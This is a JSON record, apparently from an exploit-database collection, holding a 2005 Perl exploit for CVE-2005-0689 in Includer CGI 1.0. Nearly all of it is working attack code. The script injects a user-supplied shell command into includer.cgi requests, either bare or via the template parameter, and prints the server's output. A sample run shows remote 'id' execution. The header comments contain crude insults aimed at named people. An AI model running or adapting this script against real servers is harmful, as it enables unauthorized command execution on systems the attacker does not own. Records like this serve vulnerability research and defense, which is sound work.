{
  "id": "923",
  "title": "The Includer CGI 1.0 - Remote Command Execution (3)",
  "cve": "CVE-2005-0689",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n#\r\n# [K-C0d3r] Includer.cgi 1.0 remote command execution [K-C0d3r]\r\n#\r\n# C0d3d By K-C0d3r, a www.x0n3-h4ck.org friend!\r\n#\r\n# I think the bug was discovered by Francisco Alisson.\r\n#\r\n# Greetz to: mZ, CorryL, Expanders, SiNaPsE, off, rikky, milw0rm.\r\n#\r\n# F**K o*f to all RxBot kiddies as e*****t, G***n, d***b.\r\n#\r\n##########################################################################\r\n# [kc@K-C0d3r xpl]$ perl KCincluder.pl 127.0.0.1 /cgi-bin/includer.cgi 1\r\n# [K-C0d3r] Includer.cgi Remote Command Execution Exploit [K-C0d3r]\r\n# [?] Insert command: id\r\n# [+] Conecting to 127.0.0.1\r\n# [+] Connected to 127.0.0.1\r\n# [+] Injecting command ...\r\n# uid=500(kc) gid=500(kc) gruppi=500(kc)\r\n# [kc@K-C0d3r xpl]$\r\n##########################################################################\r\n\r\nuse IO::Socket;\r\n\r\nsub Usage {\r\nprint STDERR \"Usage:\\nKCinc-xpl.pl <www.victim.com> </path/to/includer.cgi> <exploitation_type>.\\n\";\r\nprint STDERR \"Exploitation Types:\\n \\t\\t1: includer.cgi?|command|\\n \\t\\t2: includer.cgi?template=|command|\\n\\n\";\r\nexit;\r\n}\r\n\r\nif (@ARGV < 3)\r\n{\r\n Usage();\r\n}\r\n\r\n\r\n$host = @ARGV[0];\r\n$path = @ARGV[1];\r\nprint \"[K-C0d3r] Includer.cgi Remote Command Execution Exploit [K-C0d3r]\\n\";\r\nprint \"[?] Insert command: \";\r\n$command = <STDIN>;\r\n$type = @ARGV[2];\r\n\r\nif ($type > 2)\r\n{\r\n Usage();\r\n}\r\n\r\n\r\nprint \"[+] Conecting to $host\\n\";\r\n\r\nif ($type = 1)\r\n{\r\n$injection = \"$host$path?|$command|\";\r\n$socket = new IO::Socket::INET (PeerAddr => \"$host\",\r\n                                PeerPort => 80,\r\n                                Proto => 'tcp');\r\n                                die unless $socket;\r\nprint \"[+] Connected to $host\\n\";\r\nprint \"[+] Injecting command ...\\n\";\r\nprint $socket \"GET http://$injection HTTP/1.1\\nHost: $host\\n\\n\";\r\nwhile (<$socket>)\r\n{\r\n print $_;\r\n exit;\r\n}\r\n}\r\n\r\nif ($type = 2)\r\n{\r\n$injection = \"$host$path?template=|$command|\";\r\n$socket = new IO::Socket::INET (PeerAddr => \"$host\",\r\n                                PeerPort => 80,\r\n                                Proto => 'tcp');\r\n                                die unless $socket;\r\nprint \"[+] Connected to $host\\n\";\r\nprint \"[+] Injecting command\\n\";\r\nprint $socket \"GET http://$injection HTTP/1.1\\nHost: $host\\n\\n\";\r\nwhile (<$socket>)\r\n{\r\n print $_;\r\n exit;\r\n}\r\n}\r\n\r\n# milw0rm.com [2005-04-08]",
  "url": "https://www.exploit-db.com/exploits/923"
}